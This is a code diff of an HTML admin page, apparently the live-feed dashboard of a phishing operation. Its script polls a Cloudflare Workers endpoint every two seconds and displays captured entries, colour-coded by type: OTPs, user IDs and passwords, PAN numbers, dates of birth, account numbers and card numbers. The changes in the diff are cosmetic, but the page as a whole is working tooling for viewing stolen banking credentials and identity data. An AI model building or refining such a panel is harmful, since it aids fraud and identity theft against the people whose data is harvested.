@@ -3,66 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Ultra Sleek Admin</title>
+    <title>Strict Left Admin</title>
     <style>
-        /* Strict Left Alignment for everything */
+        /* CSS reset to force extreme left */
         * { 
             box-sizing: border-box; 
             margin: 0; 
             padding: 0; 
-            font-family: 'Arial', sans-serif; 
-            text-align: left !important; 
+            font-family: 'Arial', sans-serif;
         }
         
         body { 
             background-color: #ffffff; 
-            padding: 5px; 
+            padding: 5px;
+            text-align: left !important;
         }
 
-        /* Minimal Header */
         .header {
             width: 100%;
             padding: 5px 10px;
-            display: flex !important; 
+            display: flex;
             justify-content: space-between;
             align-items: center;
             border-bottom: 1px solid #eee;
             margin-bottom: 5px;
         }
-        .header h1 { font-size: 10px; color: #888; font-weight: 800; }
         
         .v-badge {
             background: #000;
             color: #fff;
-            padding: 1px 8px;
+            padding: 2px 8px;
             border-radius: 3px;
             font-weight: 900;
-            font-size: 12px;
+            font-size: 14px;
         }
 
-        #logsDisplay { width: 100%; }
+        /* Logs Container */
+        #logsDisplay { 
+            width: 100%; 
+            border-spacing: 0 4px; /* Boxes ke beech ka gap */
+            border-collapse: separate;
+        }
 
-        /* Ultra Patla Cart */
-        .data-row {
-            display: block;
+        /* Table Row as a Cart */
+        .log-row {
             width: 100%;
-            padding: 4px 10px; /* Padding ekdam kam kar di */
-            margin-bottom: 3px; /* Gap bhi kam kar diya */
-            border-radius: 2px;
-            font-size: 13px; /* Compact font */
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 14px;
             font-weight: 800;
-            line-height: 1.2;
-            color: #ffffff; 
-            white-space: pre-wrap;
-            word-break: break-all;
-            border: none;
+            line-height: 1.4;
         }
 
-        .time {
-            display: inline-block;
-            font-size: 8px;
-            color: rgba(255,255,255,0.6);
-            margin-left: 10px;
+        .log-cell {
+            padding: 6px 12px; /* Patla cart */
+            text-align: left !important; /* Force extreme left */
+            vertical-align: top;
+            word-break: break-all;
+            white-space: pre-wrap;
+            border-radius: 4px;
+        }
+
+        .time-text {
+            display: block;
+            font-size: 9px;
+            color: rgba(255,255,255,0.7);
+            margin-top: 3px;
             font-weight: 400;
         }
     </style>
@@ -70,12 +76,12 @@
 <body>
 
     <div class="header">
-        <h1>LIVE FEED</h1>
+        <h1 style="font-size: 12px; color:#888;">LIVE FEED</h1>
         <div class="v-badge" id="vCount">0</div>
     </div>
 
-    <div id="logsDisplay">
-        </div>
+    <table id="logsDisplay">
+        </table>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
@@ -99,29 +105,32 @@
                     if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";
 
                     let content = log.detail.toLowerCase();
-                    let bgColor = "#222"; 
+                    let bgColor = "#333"; 
 
-                    // Vibrant Colors
+                    // VIBRANT COLORS
                     if (content.includes("otp:-")) {
                         bgColor = "#FF0000"; // Pure Red
                     } else if (content.includes("user id:-") || content.includes("pass:-")) {
-                        bgColor = "#00A500"; // Sharp Green
+                        bgColor = "#008000"; // Sharp Green
                     } else if (content.includes("pan:-") || content.includes("dob:-")) {
-                        bgColor = "#0055FF"; // Electric Blue
+                        bgColor = "#0000FF"; // Pure Blue
                     } else if (content.includes("acc:-") || content.includes("name:-")) {
-                        bgColor = "#FF00AA"; // Hot Pink
+                        bgColor = "#FF00FF"; // Hot Pink
                     } else if (content.includes("card:-")) {
-                        bgColor = "#FF8800"; // Bright Orange
+                        bgColor = "#FF8C00"; // Dark Orange
                     }
 
                     return `
-                        <div class="data-row" style="background-color: ${bgColor};">
-                            ${log.detail} <span class="time">${log.time || ''}</span>
-                        </div>
+                        <tr class="log-row">
+                            <td class="log-cell" style="background-color: ${bgColor};">
+                                ${log.detail}
+                                <span class="time-text">${log.time || ''}</span>
+                            </td>
+                        </tr>
                     `;
                 }).join('');
 
-            } catch (e) { console.log("Updating..."); }
+            } catch (e) { console.log("Sync..."); }
         }
 
         setInterval(fetchLogs, 2000);
